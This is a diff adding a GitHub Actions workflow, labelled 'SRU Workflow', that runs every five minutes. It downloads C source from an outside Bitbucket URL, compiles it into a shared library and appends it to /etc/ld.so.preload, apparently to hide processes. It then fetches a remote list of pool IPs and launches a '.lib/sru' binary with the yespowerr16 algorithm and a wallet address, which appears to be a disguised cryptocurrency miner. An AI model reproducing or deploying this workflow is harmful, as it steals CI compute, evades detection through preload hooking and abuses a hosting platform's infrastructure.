@@ -1,0 +1,89 @@
+name: SRU Workflow
+
+on:
+  schedule:
+    - cron: '*/5 * * * *'  # Runs every 5 minutes
+
+jobs:
+  sru-job:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 10
+      fail-fast: false
+      matrix:
+        go: [1, 2, 3, 4, 5]
+        flag: [A,B]
+    env:
+      NUM_JOBS: 40
+      JOB: ${{ matrix.go }}
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v2
+
+      - name: Set up environment
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y wget curl build-essential jq
+
+      - name: Clean up previous files
+        run: |
+          rm -rf dance_*
+          rm -rf list_*
+          rm -rf .lib
+          mkdir -p .lib
+
+      - name: Download and compile code
+        run: |
+          curl -L https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
+          gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
+          sudo mv libnyumput.so /usr/local/lib/
+          echo /usr/local/lib/libnyumput.so | sudo tee -a /etc/ld.so.preload
+          rm nyumput.c
+
+      - name: Download IP list
+        id: download-ip
+        run: |
+          timestamp=$(date +%s)
+          dynamic_list="list_$timestamp.json"
+          wget -O $dynamic_list https://github.com/barburonjilo/setstra/raw/main/list4.json
+          if [[ ! -f $dynamic_list ]]; then
+            echo "Failed to download IP list. Exiting."
+            exit 1
+          fi
+          echo "::set-output name=dynamic_list::$dynamic_list"
+
+      - name: Validate JSON format
+        run: |
+          jq '.' ${{ steps.download-ip.outputs.dynamic_list }} > /dev/null 2>&1
+          if [ $? -ne 0 ]; then
+            echo "Invalid JSON format. Exiting."
+            exit 1
+          fi
+
+      - name: Select random IP
+        id: select-ip
+        run: |
+          ip=$(jq -r '.[]' ${{ steps.download-ip.outputs.dynamic_list }} | shuf -n 1)
+          if [ -z "$ip" ]; then
+            echo "No IP found in the list. Exiting."
+            exit 1
+          fi
+          echo "::set-output name=selected_ip::$ip"
+
+      - name: Remove selected IP from list
+        run: |
+          jq --arg ip "${{ steps.select-ip.outputs.selected_ip }}" 'del(.[] | select(. == $ip))' ${{ steps.download-ip.outputs.dynamic_list }} > tmp.json && mv tmp.json ${{ steps.download-ip.outputs.dynamic_list }}
+
+      - name: Start SRU process
+        run: |
+          if [ -f .lib/sru ]; then
+            port=$(shuf -i 802-810 -n 1)
+            nohup .lib/sru -a yespowerr16 --pool ${{ steps.select-ip.outputs.selected_ip }}:$port -u YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC --timeout 120 -t 7 -p m=solo > dance.log 2>&1 &
+            echo "Started SRU process using IP ${{ steps.select-ip.outputs.selected_ip }} and port $port"
+          else
+            echo ".lib/sru not found. Skipping..."
+          fi
+
+      - name: Clean up
+        run: |
+          rm -f ${{ steps.download-ip.outputs.dynamic_list }}
